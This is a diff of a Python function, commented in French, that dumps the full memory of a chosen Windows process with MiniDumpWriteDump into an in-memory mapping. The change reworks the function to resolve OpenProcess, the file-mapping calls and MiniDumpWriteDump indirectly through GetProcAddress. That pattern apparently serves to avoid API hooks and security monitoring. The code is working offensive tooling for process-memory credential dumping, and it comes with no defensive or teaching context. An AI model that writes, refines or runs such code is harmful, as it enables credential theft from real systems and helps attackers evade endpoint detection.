@@ -48,12 +48,26 @@ def get_target_process_pid(target_process_name):
 def dump_process_to_memory(pid):
     """
     Effectue un dump mémoire du processus ciblé en utilisant MiniDumpWriteDump.
-    Utilise les API Windows via ctypes avec des appels indirects pour créer un mapping mémoire temporaire.
+    Les appels aux fonctions Windows sont réalisés de manière indirecte en obtenant leurs adresses via GetProcAddress.
     """
-    k32 = ctypes.windll.kernel32
-    dbghelp = ctypes.windll.DbgHelp
+    # Chargement des modules
+    kernel32 = ctypes.WinDLL("kernel32.dll")
+    dbghelp = ctypes.WinDLL("DbgHelp.dll")
 
-    # Définition de la signature de MiniDumpWriteDump via CFUNCTYPE (appel indirect)
+    # Définition des prototypes et récupération indirecte de certaines fonctions de kernel32.dll
+    OpenProcessProto = ctypes.WINFUNCTYPE(ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD)
+    CreateFileMappingWProto = ctypes.WINFUNCTYPE(ctypes.wintypes.HANDLE, ctypes.wintypes.HANDLE, ctypes.c_void_p, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.wintypes.LPCWSTR)
+    MapViewOfFileProto = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.c_size_t)
+    UnmapViewOfFileProto = ctypes.WINFUNCTYPE(ctypes.wintypes.BOOL, ctypes.c_void_p)
+    CloseHandleProto = ctypes.WINFUNCTYPE(ctypes.wintypes.BOOL, ctypes.wintypes.HANDLE)
+
+    OpenProcess = OpenProcessProto(kernel32.GetProcAddress(kernel32._handle, b"OpenProcess"))
+    CreateFileMappingW = CreateFileMappingWProto(kernel32.GetProcAddress(kernel32._handle, b"CreateFileMappingW"))
+    MapViewOfFile = MapViewOfFileProto(kernel32.GetProcAddress(kernel32._handle, b"MapViewOfFile"))
+    UnmapViewOfFile = UnmapViewOfFileProto(kernel32.GetProcAddress(kernel32._handle, b"UnmapViewOfFile"))
+    CloseHandle = CloseHandleProto(kernel32.GetProcAddress(kernel32._handle, b"CloseHandle"))
+
+    # Définition et récupération indirecte de MiniDumpWriteDump
     MiniDumpWriteDumpProto = ctypes.WINFUNCTYPE(
         ctypes.wintypes.BOOL,
         ctypes.wintypes.HANDLE,     # Process handle
@@ -64,49 +78,53 @@ def dump_process_to_memory(pid):
         ctypes.c_void_p,            # User stream param
         ctypes.c_void_p             # Callback param
     )
-    MiniDumpWriteDump = MiniDumpWriteDumpProto(("MiniDumpWriteDump", dbghelp))
+    MiniDumpWriteDump = MiniDumpWriteDumpProto(dbghelp.GetProcAddress(dbghelp._handle, b"MiniDumpWriteDump"))
 
+    # Constantes
     PROCESS_QUERY_INFORMATION = 0x0400
     PROCESS_VM_READ = 0x0010
-    process_handle = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
-    if not process_handle:
-        print("[!] Failed to open the process.")
-        return None
-
     PAGE_READWRITE = 0x04
     FILE_MAP_WRITE = 0x0002
     dump_size = 0x1000000  # 16 MB
     INVALID_HANDLE_VALUE = ctypes.wintypes.HANDLE(-1).value
 
-    k32.CreateFileMappingW.restype = ctypes.wintypes.HANDLE
-    memory_file = k32.CreateFileMappingW(ctypes.wintypes.HANDLE(INVALID_HANDLE_VALUE),
-                                          None, PAGE_READWRITE, 0, dump_size, None)
-    if not memory_file:
-        print("[!] Failed to create file mapping.")
-        k32.CloseHandle(process_handle)
+    # Ouverture du processus cible
+    process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
+    if not process_handle:
+        print("[!] Failed to open the process.")
         return None
 
-    k32.MapViewOfFile.restype = ctypes.c_void_p
-    buffer_ptr = k32.MapViewOfFile(memory_file, FILE_MAP_WRITE, 0, 0, dump_size)
+    # Création d'un mapping mémoire
+    memory_file = CreateFileMappingW(ctypes.wintypes.HANDLE(INVALID_HANDLE_VALUE),
+                                       None, PAGE_READWRITE, 0, dump_size, None)
+    if not memory_file:
+        print("[!] Failed to create file mapping.")
+        CloseHandle(process_handle)
+        return None
+
+    # Mapping de la vue du fichier
+    buffer_ptr = MapViewOfFile(memory_file, FILE_MAP_WRITE, 0, 0, dump_size)
     if not buffer_ptr:
         print("[!] Failed to map view of file.")
-        k32.CloseHandle(memory_file)
-        k32.CloseHandle(process_handle)
+        CloseHandle(memory_file)
+        CloseHandle(process_handle)
         return None
 
     MiniDumpWithFullMemory = 0x00000002
     if not MiniDumpWriteDump(process_handle, pid, memory_file, MiniDumpWithFullMemory, None, None, None):
         print("[!] MiniDumpWriteDump failed.")
-        k32.UnmapViewOfFile(buffer_ptr)
-        k32.CloseHandle(memory_file)
-        k32.CloseHandle(process_handle)
+        UnmapViewOfFile(buffer_ptr)
+        CloseHandle(memory_file)
+        CloseHandle(process_handle)
         return None
 
+    # Récupération des données du dump
     dump_data = ctypes.string_at(buffer_ptr, dump_size)
 
-    k32.UnmapViewOfFile(buffer_ptr)
-    k32.CloseHandle(memory_file)
-    k32.CloseHandle(process_handle)
+    # Nettoyage
+    UnmapViewOfFile(buffer_ptr)
+    CloseHandle(memory_file)
+    CloseHandle(process_handle)
 
     return dump_data
 
